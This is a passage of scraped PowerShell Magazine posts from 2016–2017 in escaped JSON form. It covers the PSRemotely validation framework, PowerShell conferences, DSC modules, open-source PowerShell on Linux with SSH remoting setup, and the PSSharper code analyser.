\u0026#34;Validate the Management NIC \u0026#34; { Remotely ComputeNode1, ComputeNode2 {IPv4Address \u0026#39;vEthernet(Management)\u0026#39; {Should be $ManagementIPv4Address}} } Context \u0026#34;Validate the Storage1 NIC\u0026#34; { Remotely ComputeNode1, ComputeNode2 {IPv4Address \u0026#39;vEthernet(Storage1)\u0026#39; {Should be $Storage1IPv4Address}} } Context \u0026#34;Validate the Storage2 NIC\u0026#34; { Remotely ComputeNode1, ComputeNode2 {IPv4Address \u0026#39;vEthernet(Storage2)\u0026#39; {Should be $Storage2IPv4Address}} } } The above syntax looks quite descriptive and decouples the validation tests and environment details too.\nBut there were some downsides to the above approach.\n Requires us re-writing our existing tests to accommodate keyword Remotely for executing script block on remote and running assertions locally. Remotely connects each time to all the nodes to run each PoshSpec based ops validation tests. Results in lot of overhead to run a large number of validation tests. Trouble passing environment specific data to the remote nodes e.g. in the above tests passing the expected IPv4 address to the remote node. For running Pester/PoshSpec tests on the remote nodes, these modules need to be present on the remote node, to begin with.  The existing Remotely framework was meant to execute script block against a remote runspace but it was not specifically built to perform operations validation remotely.\nEnter PSRemotely After trying to integrate Remotely with Pester/PoshSpec based tests, we had a general idea on what we needed from a framework/DSL, if it was to provide us with the capability of orchestrating operations validation remotely on the nodes. Below are some of those features we had in mind along with the arguments for these to be implemented:\n  Target Pester/PoshSpec based operations validation tests on the remote nodes.\n  Allow specifying environment data separately from the tests, so that same tests could be applied across on nodes.\nWe decided on the ability to use DSC Style configuration data here for specifying node specific environment details.\n  Easier debugging on the remote nodes, in case tests fail.\nIf something failed on the remote node during validation, we should be able to connect to the underlying PowerShell remoting session and debug issues.\n  Allow re-running specific tests on the remote nodes.\nIn case a test failed, performing a quick remediation action and validating that specific test passed it is a good to have feature when you have lot of tests in your suite.\n  Self-contained solution.\nHave the framework bootstrap the remote nodes with required modules version (Pester \u0026amp; PoshSpec) under the hood. Remote nodes might not have internet connectivity here.\n  Allow copying required artifacts to remote nodes.\nFor our solution, we require a manifest file with details about the deployment to be copied on each node.\n  Use PowerShell remoting as underlying transport mechanism for everything.\n  Return bare minimum JSON output, if everything passes. If a test fails then return the error record thrown by Pester.\n  And, PSRemotely was born!\nSo after a lot of discussions with Ravi, I finally got insight on how the remote operations validation DSL should look like:\n$CredentialHash = @{ \u0026#39;ComputeNode1\u0026#39; = Get-Credential #\u0026#39;ComputeNode2\u0026#39; = Import-CliXML # If a node is missed here, current user creds are used with PSRemoting } Configuration data, can be generated separately or specified from a .psd1 or .json file\n$ConfigData = @{ AllNodes = @( @{ NodeName = \u0026#39;*\u0026#39; DomainFQDN = \u0026#39;dexter.lab\u0026#39; }, @{ NodeName = \u0026#34;ComputeNode1\u0026#34; ManagementIPv4Address = \u0026#39;10.10.10.1\u0026#39; Storage1IPv4Address = \u0026#39;10.20.10.1\u0026#39; Storage2IPv4Address = \u0026#39;10.30.10.1\u0026#39; Type = \u0026#39;Compute\u0026#39; }, @{ NodeName = \u0026#34;ComputeNode2\u0026#34; ManagementIPv4Address = \u0026#39;10.10.10.2\u0026#39; Storage1IPv4Address = \u0026#39;10.20.10.2\u0026#39; Storage2IPv4Address = \u0026#39;10.30.10.2\u0026#39; Type = \u0026#39;Compute\u0026#39; } ) } PSRemotely tests, specify CredentialHash and Configuration data to the PSRemotely\nPSRemotely -ConfigurationData $ConfigData -CredentialHash $CredentialHash { Node $AllNodes.Where({$_.Type -eq \u0026#39;Compute\u0026#39;}).NodeName { #Below are the existing Pester/PoshSpec-based tests, with changes on how node specific data is supplied Describe \u0026#39;TestIPConfiguration\u0026#39; -Tag IP { Context \u0026#34;Validate the Management NIC\u0026#34; { # pre-deployment script always creates NICs with these names IPv4Address \u0026#39;vEthernet(Management)\u0026#39; {Should be $Node.ManagementIPv4Address} } Context \u0026#34;Validate the Storage1 NIC\u0026#34; { IPv4Address \u0026#39;vEthernet(Storage1)\u0026#39; {Should be $Node.Storage1IPv4Address} } Context \u0026#34;Validate the Storage2 NIC\u0026#34; { IPv4Address \u0026#39;vEthernet(Storage2)\u0026#39; {Should be $Node.Storage2IPv4Address} } } } } After having a clear idea on the features required in the framework and how we wanted the DSL to look like, I started working on it. This post has set up the context on why we began working on something entirely new from scratch.\nJoin me in the second post where I try to explain how to use PSRemotely to target remote nodes for operations validation.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/04/07/psremotely-framework-to-enable-remote-operations-validation/","tags":["DevOps","Pester","Modules"],"title":"PSRemotely – Framework to Enable Remote Operations Validation"},{"categories":["News"],"contents":"Modern administrators are responsible for business-critical automation, influence IT architectural design, and are a crucial part of corporate security both in daily operations and in conceptual planning. PowerShell is the driving force behind most of this, and rapidly expands and evolves.\nWhile you find plenty of PowerShell beginners classes to teach fresh admins the fundamentals, it’s much harder to find places for experienced admins to learn relevant new information and be on equal height with speakers and other delegates. psconf.eu is such a place and lightened up last year as a completely new PowerShell event format.\n“Can’t wait for another #psconfeu!”, “You don’t want to miss this”, “best conference”, “highlight of the year” is just some feedback when you search Twitter for #psconfeu. Let’s take a look at what makes psconf.eu so special, and what to expect this year!\nThis year, the conference has an unprecedented speaker lineup: five of the six powershellmagazine.com editors will be there and speaking. PowerShell inventor Jeffrey Snover opens the conference with his keynote “State of the Union”. Microsoft sends six PowerShell team members covering PowerShell 6, Open Source, DSC, PowerShell for VSCode, and more. So you’re not just getting answers – you are talking directly to the people actually doing these things. And get first hand information, including where the PowerShell journey will go next.\npsconf.eu covers all major areas of PowerShell.\nSpecial Trainings Ops Right before the main conference starts, you have the option to participate in our optional preconf special trainings day. These are definitely no MOC-style courses. Workshops aim to bring experienced people up to speed. You can polish fundamentals, dive into topics that are new to you (like DSC, GUIs, or JEA Security), and warm up. These “Special Trainings” make sure you get the most out of the main conference sessions, and prepare yourself for topics that may be new to you – like DSC, or JEA, or building GUI tools. Workshops are available in English and in German, and you can suggest more topics by contacting us via the contact form at the bottom of psconf.eu.\nOpening Day On day 1, we open the conference with delegate registration and then start together in the great historic Leibniz Saal. PowerShell inventor Jeffrey Snover delivers the keynote “State of the Union”, summarizing where PowerShell stands today and where it is heading in the light of being open source now and available on Linux and OS X.\nWe’ll then warm up with “Quiz and Quirks”: I extracted some of the funniest and strangest questions asked in our internal MVP forum, and you get the chance to test your knowledge and learn new things: would you have been able to answer the MVP questions easily? We are all in this conference together, and this session encourages interaction, asking questions, and being part of it.\nWill “Harmj0y” Schroeder finally ends the morning with an awesome security presentation. His presentation last year was crammed, so we wanted him to deliver it in the largest room we have: listen closely where attackers can sneak into your systems, and how PowerShell can be used both as a forensic and penetration testing tool.\nWe all then have a good lunch together, and move into the workshop area. After lunch, we fan out into four tracks, giving you the choice. Track 1 will be in German, and tracks 2, 3 and 4 in English.\nIn the afternoon, you have the chance to meet many of the renowned speakers in person, and make connections. After the first round of presentations, we all come back to Leibniz Saal for the “Ask the Speakers Roundtable”.\nThen, we walk over to the Hannover Zoo to enjoy the Evening Event.\nEvening Event in the Zoo The evening event is absolutely unique: we have “Yukon Bay”, an ancient gold digger town, all to us. We’ll have great food and drinks, beer and wine, and the chance to hang loose and make new connections and friendships. Everyone will be there, including all speakers. You may want to continue to talk about PowerShell, but you may just as well just kick back and enjoy the evening.\nConference Day 2 + 3 On the remaining two days, we fan out in 5 parallel tracks. Track 1 stays German, and the other four tracks deliver English sessions. 19 Microsoft MVPs, six PowerShell team members, former MVPs, Engineers from Microsoft Germany, and many other awesome PowerShell experts deliver presentations covering pretty much all areas that are relevant to PowerShell.\nTo give delegates the chance to even better connect to speakers, we’ll have designated “Ask the Experts” areas during lunch so you can socialize with the people from your favorite field of interest.\nNet length for all presentations is 45 minutes sharp. We want presentations to be concise and on the point, and prefer demos over endless slides. At the end of each slot, you have 15 minutes of Q\u0026amp;A. If you are hungry for more, you can ask the speaker to extend: we have breakout-session rooms available where you have all the time you need for extensive Q\u0026amp;A, and where you can hold spontaneous whiteboard sessions or meet with user groups.\n\nThe conference ends on May 5 at 16:30h (4:30 pm). We provide a baggage room to leave your stuff. Here is the preliminary agenda for day 3.\nOf course, we are working on conference memorabilia to take home – these are secret until the conference starts. Except for our famous “PowerShell container”: you’ll get one of these limited collectors items of course.\nRegister Now – Seats are Limited We want this conference to stay personal. So even though we decided to further increase number of speakers and tracks, there’s room for a maximum of roughly 250 delegates. Half of these seats were taken before we published the agenda, and last year’s event sold out. We’d love to see you join this fun PowerShell event!\nWhen you register on www.psconf.eu, your seat is immediately reserved for 30 days, and you receive an invoice. Pay it within 30 days, and your seat is secured.\nIf you have any additional questions, please use the contact form at the bottom of www.psconf.eu to get in touch. Looking forward to seeing you soon!\nTobias\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/02/02/powershell-conference-eu-2017-speakers-and-sessions/","tags":["News","Conferences"],"title":"PowerShell Conference EU 2017 – Speakers and Sessions"},{"categories":["Tips and Tricks"],"contents":"Tab completion is a well-known feature in PowerShell, which speeds up the process of typing and reduces the risk for typing mistakes. The feature can autocomplete things like nouns and parameters, as well as values for parameters if PowerShell knows what type of object the parameter is expecting. The first two has been around since version 2.0, while the latter was introduced in version 3.0.\nA less known feature is that the -Property parameter of Select-Object and the Format- cmdlets has supported parameter value completion since version 2.0.\nLet us have a look at this feature in action. In the first example run in the PowerShell ISE, we press Ctrl + Space to bring up the tab completion feature:\nIn the second example, we use the Tab key to invoke tab completion:\nWhen using the Tab key, the feature also works in the console host (powershell.exe):\nThe PSReadLine module (included by default in Windows 10/WMF5 and later), also provides support for Ctrl + Space in the console host:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/10/31/pstip-tab-complete-properties/","tags":["Tips and Tricks"],"title":"#PSTip Tab complete properties"},{"categories":["Module Spotlight","Hyper-V","PowerShell DSC"],"contents":"I just finished testing and publishing the cHyper-V PowerShell DSC resource module to the PowerShell Gallery. I took some time to make changes to this module–fix bugs and add new functionality. This module on PowerShell Gallery has over 1,500 downloads across all versions whereas the xHyper-V module has over 8000 downloads.\nThis means there is certainly significant interest in the cHyper-V module and it is time for me to find ways to merge it with the official HQRM module for Hyper-V at some point in future. I need to work towards that. In preparation towards that goal, I started updating my module in a phased approach.\nPhase 1 of the process was complete today. I made the following changes to this module.\n Removed cNATSwitch resource. This really belongs to xNetworking module and I will open that PR later next week. Removed cSwitchEmbeddedTeaming and enabled that functionality in cVMSwitch. Added cVMIPAddress for anyone who wants to inject IP addresses into a VM running Windows guest OS using DSC. This is very helpful, at least for me, in building automated labs. More on this later. Added cWaitForVMIntegrationComponent for the same reason as cVMIPAddress. Updated cVMNetworkAdapter to fix bugs and make enhancements based on an open PR in xHyper-V repository. I will push this update to xHyper-V soon to close that PR. Added a comprehensive list of examples for each resource in this module.  Moving on to phase 2 of this module development, I will add tests to ensure complete code coverage–both in terms of unit tests and integration tests. This should be complete by end of this week. So, you will see a minor update of this module in my GitHub repository. I have these tests running internally after every commit but I just don’t want to make them public in their current state.\nIn the final phase of the module preparation to align with the HQRM guidelines, I will open pull requests to xHyper-V module to add all new resources and push updates to the existing resources. This should be complete within next month.\nOverall, I am very happy with this phased approach and it is helping me do things at my own pace while enabling me to make progress regularly. cHyper-V will continue to exist for all the experimental Hyper-V DSC resources I continue to create. In fact, I have a bunch of them such as cSimpleVM, cVMCommand, cVMFile, and so on.\nStay tuned for more.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/10/24/what-is-new-in-chyper-v-powershell-dsc-resource-module/","tags":["Hyper-V","PowerShell DSC","Modules"],"title":"What is new in cHyper-V PowerShell DSC Resource Module?"},{"categories":["Azure DevTest","Azure","PowerShell Linux"],"contents":"Update: The PowerShell on Linux artifact is now available in official Azure DTL artifact repository.\nBartek and Ben have written a great introduction article on open source PowerShell. I have been experimenting with it ever since and installed it on my lab and Azure VMs. When it comes to Azure, I also use DevTest Labs (DTL) a lot for creating my test setup. Azure DTL supports customization of VMs in the lab using artifacts. Artifacts are used to deploy and configure your application after a VM is provisioned. An artifact consists of an artifact definition file and other script files that are stored in a folder in a Git repository. We can create custom artifacts and achieve what is not supported out of the box with Azure DTL. The following video provides a walk-through of creating custom DTL artifacts.\n[https://channel9.msdn.com/Blogs/Windows-Azure/How-to-author-custom-artifacts/player]\nI quickly created a DTL artifact for installing PowerShell on Linux. I opened a pull request to merge this artifact into the official artifacts repository and you can deploy this from the official artifact repository.\nIn the official artifact repository, you can find the artifact listed with Linux VM settings in DTL.\nOnce you select the PowerShell on Linux artifact, you will be prompted for the package URL.\nYou can obtain this package URL from the PowerShell GitHub repository’s releases page. On this page, you will see links to either .deb or .rpm packages. For Ubuntu, copy the link to .deb package and for CentOS, use the .rpm link.\nEnter the copied URL into the Package URL input box and click Add and then click Apply. The artifact installation will take a few minutes and you should be able to use PowerShell in the Linux VM.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/08/22/azure-devtest-labs-artifact-for-installing-powershell-on-linux/","tags":["Azure","Azure DevTest","Linux"],"title":"Azure DevTest Labs Artifact for Installing PowerShell on Linux"},{"categories":["News","PowerShell Linux"],"contents":"This article was co-authored by Bartek Bielawski and Ben Gelens.\nWindows PowerShell is a powerful tool, but it always had one very serious limitation: it was possible to run it only on Windows. There had been several attempts to change that, including projects like Pash. However, without support from PowerShell Team these projects had very little chance of catching up with a platform that was growing with each release of PowerShell on Windows.\nAlmost two years ago in November 2014 when it was announced that .NET Core will become open source project available for multiple platforms including Linux. Many of the PowerShell enthusiasts started to ask the question: when will the same happen to the Windows PowerShell. Finally, the day has come–August 18, at 11:14 EST! The time picked for that announcement may look odd at first, but it’s not a coincidence. It’s a way to celebrate anniversary of the public release of Windows PowerShell version 1, on 14 November, 2006. PowerShell is not only open source now, it’s also available for multiple platforms, including several Linux distributions. You can clone repository and build it on your own, you can fork it and change it and last but certainly not least – you can fix it yourself! Pull requests will be accepted, with details on how to contribute to this project described directly in documentation provided on project’s GitHub page.\nPowerShell on Linux As you can see this announcement is huge – not only you can freely read and change the code of the PowerShell itself, you can build it and run it almost anywhere. If you want to do just that, you have several packages prepared for different operating systems, including Windows, Linux, and OS X. Packages come with instructions, but these are relatively simple. It all boils down to installing dependencies and the PowerShell package, or just the package itself (if it contains information about dependencies). Installation of CentOS 7.1 requires running single command:\nsudo yum install powershell-6.0.0_alpha.9-1.el7.centos.x86_64.rpm This package has two dependencies (important to know if you want to install PowerShell on the machine that can’t download packages from the external repositories):\nPS /home/bielawb\u0026amp;gt; rpm -qR powershell libunwind libicu rpmlib(PayloadFilesHavePrefix) \u0026lt;= 4.0-1 rpmlib(CompressedFileNames) \u0026lt;= 3.0.4-1 Once the PowerShell is installed, you should be able to call it, and start exploring it.\nWhat works and what doesn’t work What can you expect in Alpha release of PowerShell on Linux? Anything that is related to the core PowerShell functionality works as expected. We have whole group of the object-related commands, we have commands to import, export, and convert multiple file formats. Modules are available and we can create our own modules using PowerShell syntax.\nLanguage constructs work just fine, including configuration (requires PowerShell DSC for Linux to be installed on the same box) and classes. The only exception to this rule is PowerShell Workflow. We can test our code with Pester, we have PSReadLine to make our life easier. We can create instances of .NET Core classes and behavior is similar to the one we have on Windows.\nPeople like me who expect certain Linux commands to be served as aliases pointing to cmdlet that serve similar purpose should be prepared for a little surprise. I know it took me a good few minutes before I figured out that the result of “ls” is different, because PowerShell doesn’t hide the built-in command with an alias. There are two possible solutions to this problem: define the alias yourself, or use other aliases (e.g. “dir” or “gci” for Get-ChildItem).\nAnd of course Linux file systems are case sensitive which PowerShell respects:\nAnother surprise is a result of presence of PSReadLine module. On Linux, iPSReadLine is using emacs mode by default (so certain key bindings are different than the one used on Windows, others have more Linux-like behavior). Both aliases and PSReadLine configuration can be adjusted using familiar technique – creating PowerShell profile:\nPS /home/bielawb\u0026amp;gt; $PROFILE /home/bielawb/.config/powershell/Microsoft.PowerShell_profile.ps1 PowerShell on Linux still have some missing pieces. First of all, most of the cmdlets that depend strongly on the Windows APIs or full version of .NET Framework are not available. For obvious reasons most of the providers do not exist in PowerShell on Linux. Perfect example of that is registry. Another thing that is not working at the time of writing this article is PowerShell jobs. Also CIM cmdlets are absent at this point in time.\nPowerShell in action There are probably a lot of scenarios where PowerShell (even in the current, not fully-baked state) can be useful on Linux. Let me name a few of them.\nFirst of all, there are at least two types of objects on Linux that will behave in a way similar to their behavior on Windows: objects in the file system and processes running on our node. The only difference is a result of differences between systems: existing properties, case in the names of files and folders in the file system and more. But that doesn’t change the fact that reading both disk and list of the processes we will get objects back: objects that we can easily sort, group, filter, or format. For example, to display list of processes that use the most CPU, we can use the same line that would give us that information on Windows:\nGet-Process | \u0026gt;\u0026gt; Sort-Object -Property CPU -Descending | \u0026gt;\u0026gt; Select-Object -First 5 It’s important to remember that “sort” exists as a Linux command, so we need to use a full name of the cmdlet rather that its alias. Another example, related to the file system: we can get a list of the files in the current directory and pick the one that were changed most recently:\nPS /home/bielawb\u0026gt; Get-ChildItem | \u0026gt;\u0026gt; Sort-Object -Property LastWriteTime | \u0026gt;\u0026gt; Select-Object -Last 1 -Property Name, LastWriteTime We can also turn Linux configuration files into complex objects. Perfect example: grouping existing users based on their shell:\nipcsv /etc/passwd -Delimiter \u0026#39;:\u0026#39; -Header Name, Pwd, UID, GUID, Info, Home, Shell | \u0026gt;\u0026gt; Group-Object Shell As you can see – files don’t have to be in any known format, as long as we can pretend they are or structure them in a way that PowerShell understands.\nHere is an example of poor-man’s ISE: tmux with vim running in upper pane, and PowerShell running in the lower pane.\nBuild your own PowerShell If you want to start building PowerShell on your own you have two options: install PowerShell from package first and then use tools provided by PowerShell Team in the GitHub repository, or follow the step-by-step instructions and build PowerShell from bash. If you select former method all you have to do is to clone the repository, set your location to newly created folder, import module designed to aid you in the build process and run two commands: one to prepare prerequisites and one to start actual build process:\ngit clone --recursive https://github.com/PowerShell/PowerShell.git cd PowerShell Import-Module ./build.psm1 Start-PSBootstrap Start-PSBuild Once the build process is finished, you can launch newly created executable – PowerShell will inform you about location of the finished version.\nManual process is not complicated either (assuming you have prerequisites installed). First, you have to compile libpsl-native Library:\npushd src/libpsl-native cmake -DCMAKE_BUILD_TYPE=Debug . make -j make test popd And then, you just need to run “dotnet restore” in the root folder of repository and “dotnet build –configuration Linux” in the src/powershell-unix folder. But if you just want to use PowerShell on Linux – packages are your best choice. They have very few dependencies and can run on very limited version of Linux.\nPowerShell Remoting over SSH Another exciting capability I’ve been waiting for is PowerShell remoting over SSH! With PowerShell 6.0.0-alpha.9, all core requirements to make this possible have been introduced.\nFor Linux end we just need to be sure to install the SSH server Daemon (yum install -y openssh-server if not already installed) and client (yum install -y openssh-client. We should edit the /etc/ssh/sshd_config file to include PowerShell as a subsystem using your favorite text editing tool (e.g. vi, nano).\nThe rest of the settings are OK by default. These are the required ones:\n  PasswordAuthentication yes\n  RSAAuthentication yes (optional for RSA key authentication)\n  PubkeyAuthentication yes (optional for RSA key authentication)\n  Then restart the SSH Daemon by typing:\nsystemctl restart sshd We can now remote over SSH. Let’s try it by setting up a remoting session to the localhost first.\u0026gt;\nYou can use New-PSSession with the -HostName and -UserName parameters. Optionally you could make use of a key file for authentication using the -KeyPath parameter and specifying the path to the key file (this would save you from typing your password interactively). Currently there is no support for PSCredential authentication but this will be added later.\nAs you can see in the screenshot, you will be prompted to give your consent for connecting to this unknown computer. This will happen only once. Next we have the session available and we can use Invoke-Command with it:\nAnd of course, enter it:\nPowerShell is also available on Windows which means we can also remote to a Windows machine over SSH from a Linux machine and vice versa.\nTo enable this on Windows, we need to install PowerShell for Windows package and also install Win32-OpenSSH (download the latest release here: https://github.com/PowerShell/Win32-OpenSSH/releases). Install OpenSSH to C:\\Program Files\\OpenSSH using the install instructions found here: https://github.com/PowerShell/Win32-OpenSSH/wiki/Install-Win32-OpenSSH. Add C:\\Program Files\\OpenSSH to the System Path environment variable and you are all set.\nIf things don’t work for you, your best bet for starting troubleshooting is to stop the SSH Daemon server (“systemctl stop sshd” on Linux or “Stop-Service sshd” on Windows) and run it interactively.\nIn this example, I intentionally mistyped my password to show the daemon’s output.\nRapid community adoption Toolmakers are adopting PowerShell on Linux rapidly. For example, ISESteroids 2.6.1.0 surfaced today and ships with compatibility checkers that help identify code issues that would prevent PowerShell code from running smoothly on Linux (powertheshell.com).\nSummary was waiting for this day for a very long time. No words can describe how excited I am about the news. I probably won’t be able to fix bugs, or improve documentation (but I’m sure many of you will be). However, I can do many other–previously impossible or hard to achieve, tasks. I can configure my Linux account to use PowerShell as a primary shell. I can use familiar tools when managing Linux. I can analyze files on the Linux box and make their content behave like a real object. And last but certainly not least: We have finally gotten PowerShell as an OS-agnostic, cross-platform (Windows, Linux, and OS X) automation and configuration tool/framework!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/08/18/open-source-powershell-on-windows-linux-and-osx/","tags":["News","Linux"],"title":"Open source PowerShell on Windows, Linux, and OS X!"},{"categories":["News"],"contents":"PowerShell Conference Asia is back. After a successful last year, we are back with a really exciting line up of sessions and speakers. This time around, we have speakers from all around the world flying to Singapore and share their PowerShell experiences and expertise with our attendees. Speakers include several members of the Windows PowerShell team from Microsoft headquarters in Redmond and a strong line-up of MVPs, well-known international speakers, and community contributors. They’ll cover in-depth topics on the PowerShell language and how you can use PowerShell to automate the technologies you use every day.\nFrom the PowerShell team, we will have Angel Calvo, Kenneth Hansen, Hemant Mahawar, and Jason Shirk. This team has the history and expertise to cover every concept/topic within Windows PowerShell. There will be strong focus on using PowerShell to enable DevOps practices whether On Premises or in the cloud.\nThe main event runs on Friday (October 21st) and Saturday (October 22nd), but we also have a pre-conference day on Thursday (October 20th), where we will have some vendor-led workshops where you will have the opportunity to be introduced to and get hands on with tools and technologies in the DevOps and Automation space. If that’s not your thing, we have a 1 day PowerShell refresher crash course led by one of the best PowerShell trainers in the United States. All included in your ticket price. This is geared up to make sure you get the most from being a conference attendee.\nOur full schedule on Friday ends with drinks and nibbles at a local bar and Saturday with a closing session. If you have travelled to Singapore, you can head right home on Sunday or some sightseeing and a follow up lunch with peers and speakers.\nWe have opened ticket sales for this event.\nhttps://www.eventbrite.sg/e/powershell-conference-asia-2016-tickets-26365552076\nGroup Offer Register three or more persons for 15% off the ticket price. If you plan to register as a group, email matt@psasia.org for a group discount code and instructions on how to register before buying your tickets.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/08/15/announcing-regisrations-powershell-conference-asia-2016-singapore/","tags":["News","Conferences"],"title":"Announcing Registrations – PowerShell Conference Asia 2016, Singapore"},{"categories":["News"],"contents":"PowerShell is everywhere these days. And solid PowerShell skills are probably among the most important personal career factors for an IT professional today. Such skills are crucial for enterprises as well. They need safe and state-of-the-art PowerShell code, and not copy/pasted code fragments that may or may not fit the intended purpose.\nThe true challenge is that daily business often does not leave the room for education. Most IT professionals learn PowerShell “on the job”, and even experienced PowerShell folks often work under time pressure, occasionally missing best practices and security issues.\nPSSharper V2, shipping in ISESteroids 2.6, aims to solve both needs. It helps you improve your personal skills that you will keep forever, and helps enterprises get better code quality, while working on daily tasks. So there is no extra time needed, and in fact, PSSharper will actually decrease the time needed to write PowerShell solutions. Let’s check out how.\nUnobtrusive Suggestions PSSharper works pretty much like your personal PowerShell buddy looking over your shoulder while you are coding. When your code violates a best practice or has other issues, PSSharper adds unobtrusive adornments to your code. Adornments can be squiggles in different colors, or text attributes such as strike-through or ghosting. Have a look:\nIn the example code, you see different types of squiggles, and the parameter $Path appears ghosted, indicating that it may be undefined. When you hover over an adornment, a tooltip explains the issue to you so you can learn what’s wrong here. Let’s hover over the ghosted parameter:\nThe tooltip reports two issues: the parameter may be undefined, because it is an optional parameter with no default value, and it has no type constraint, so anything could be assigned to it. With the help of the tooltips, you can quickly screen your code and see what might need further improvements. Let’s hover over the command dir:\nAgain, there are two issues. The code uses an alias instead of the real command name which can be dangerous because aliases may not always exist, and the command uses positional arguments which introduce both room for errors, and make the code harder to read.\nOne-Click Fixes Most issues can be auto-corrected easily. When you click a squiggle or adornment, the debugger margin displays a light bulb. Click it to see auto-fix options. Let’s first try this with the parameter issue:\nFor both issues, the context menu offers auto-fixes. Since the parameter has no default value, PSSharper suggests to make it mandatory, and when you choose the fix, the code now looks like this:\nAny code change introduced by PSSharper is marked with a light green background so you can review the changes, or undo them, for example, by pressing CTRL+Z. What’s more important: PSSharper not only fixes the issue, it actually shows you what to do. So even if you couldn’t remember how to make a parameter mandatory, by looking at the new code, you immediately see how it is done – and maybe have learned something new.\nLet’s fix the command call, too:\nThe context menu that appears when you click the light bulb again offers fixes for both issues. When you click both fixes, the code now looks like this:\nThese are just simple examples. In everyday life, you will get many more helpful suggestions. For example, take a look at this awkward command call:\nOften, command calls like this stem from Internet code. Simply click the light bulb to fix the issues. The results now looks like this:\nPSSharper automatically standardized the call, and removed all ad-hoc shortcuts that were intended for interactive PowerShell commands, not for scripts. The resulting command is much easier to read, helping IT staff to better work together.\nHere is another example, before we move on. Can you guess what is wrong with this call?\nAfter fixing the issues, the code looks like this:\nOne of the detected issues was an absolute path that could prevent your script from running on other machines. PSSharper has automatically replaced part of the absolute path with a suitable Windows environment variable to make your code portable.\nPSSharper Bar PSSharper evaluates your code in real-time and displays the result in categories at the bottom of the editor window. This gives you a quick overview of all issues in your script:\nIn the example screen shot, there are 2 warnings, 3 suggestions, and 2 infos. If you do not like this bar, you can hide it by clicking the “cross” icon at the left side. It will then slide out of view. You can always re-open it by either clicking a lightbulb and choosing “Show PSSharper Bar”, or by using the menu “PSSharper”.\nTo find out more about issues, or even bulk-fix them all, click a category in the PSSharper bar. This opens an add-on panel, listing all issues. Here is an example of a larger script, the legendary “WMI Explorer” from MOW:\nThe PSSharper bar uses expanders to group the issues, and when you expand a group, you see a quick code preview. The selected item also shows a “magnifying glass” icon. Click it to see more options:\nIn the context menu, you can fix a single issue, or fix all issues of this kind. Also, at the bottom of the context menu, you can choose “Why is PSSharper suggesting this?” to learn more about the particular issue, and why it is raised.\nIgnoring Rules A very important aspect in the design of PSSharper was the ability to customize. You decide which rules concern you, and which rules you choose to ignore. For example, while it is best practice to use single quotes for text that has no expandable content, some companies prefer to use double quotes for all strings no matter what.\nTo ignore a rule, click the “gear” symbol in the main issue header, and choose “Ignore this rule”. The rule is immediately disabled, all squiggles and adornments related to it are removed, and the rule is moved into the category “Ignored Rule”.\nAnd that’s important: even if you choose to ignore a rule, it will still be evaluated, and you can always see in the PSSharper Bar whether or not there are ignored rules that would apply if they were enabled. So you can easily click “Ignored Rule” in the PSSharper Bar to re-evaluate ignored rules at any time, and re-enable them there if you made up your mind.\nPersonalize Squiggles and Adornments Issues may have different importance to different users, and while some users like to see a big squiggle to get alarmed, others would like a more discreet adornment. This is why you can completely customize the adornments a particular rule uses to alert you.\nSimply click the “gear” icon again in a rule header, and choose “Personalize”. You now can pick the squiggle and text adornment used for this rule. You can even change the squiggle colors if you want.\nNote that squiggle colors are stored in your current color profile, whereas all other settings are stored in your current PSSharper configuration. We’ll touch that in a second.\nTargeting PowerShell Version Code analysis is useful only if it produces precise results, and no false alarms. Most obviously you don’t want to get code fix suggestions that turn out to break your code or compatibility.\nThis is a challenge because there are so many PowerShell versions out there. Some issues apply only to certain PowerShell versions, and some fixes require PowerShell capabilities not found in all PowerShell versions.\nOne of the most important settings is therefore to choose the PowerShell version(s) you want to target. This is a trade-off: the more PowerShell versions you (must) target, the less fixes are available, and the less sophisticated will your code get.\nTo pick the target PowerShell version, in the PSSharper Add-on, click the version link at the top:\nAs soon as you change the target range of PowerShell versions, PSSharper refreshes its view. Depending on the versions you chose, you will now get a completely different set of issues, fixes, and compatibility information.\nCompatibility Information PSSharper integrates what was formerly called “CompatAware”: the PSSharper Bar has a category called “Compat” which lists all issues related to compatibility. With just one quick glance, you can check whether code complies with the PowerShell target versions you set earlier.\nNote that this information may not be exhaustive. Just with code issues, we are constantly adding new definitions. PSSharper provides positive lists. All issues listed are indeed something that needs your attention, but there may be more issues that are not (yet) detected by PSSharper.\nRuntime Error Detection PSSharper treats runtime errors originating in a script just like any other issue. So if you run a script, and a runtime error occurs, the runtime error is listed in the category “Error”. The tooltip displays the original error message (and coincidentally is localized in the below screen shot because it was taken from a German system).\nSince runtime errors are just issues to PSSharper, you can auto-fix them. Simply click the light bulb to apply the fix:\nAutomatically, PSSharper detects the kind of runtime error, and adds the wrapping code for a specific error handler. The resulting code looks like this:\nAs you see, PSSharper does all the tricks parts. It detects that the particular error was of type Microsoft.PowerShell.Commands.ServiceCommandException, adds a specific catch clause, and even adds the –ErrorAction Stop to the cmdlet, ensuring that the exception can be caught.\nInside the error handler, the error information is retrieved and written to a custom object that you now can use to log the error, or handle it in other ways.\nBatch Fixing You can even polish entire scripts, and batch-apply fixers. This however should be done with care because all code changes are on a best effort basis, and it is your risk to apply them. When you apply a single fix, you can immediately double-check the result. When you bulk-apply fixes, this is different. And that’s why “Batch Run” mode is not enabled by default.\nTo batch-enable a particular rule, in the PSSharper Add-on click the “gear” icon in an issue group header, and choose “Batch Enabled”. You can then run all batch-enabled rules in bulk by clicking the button “Batch Run” at the bottom of the add-on panel.\nCreating PSSharper Configurations Maybe in one scenario, you want PSSharper to target only major issues, and in another, you want a complete issue list. Or one day you’d like noticeable squiggles for issues, and on another, you prefer minimal adornments.\nPSSharper configuration files help you switch. Simply configure PSSharper the way you like, then click the button with the downwards triangle in the upper right corner of the PSSharper Add-on. It lets you save your current settings, and also offers to load different configurations you may have saved earlier.\nReporting You can even export the information collected by PSSharper in object form, then use your own PowerShell code to derive reports or other useful things from it.\nSimply click the button “Export” at the bottom of the PSSharper Add-on. It actually runs the 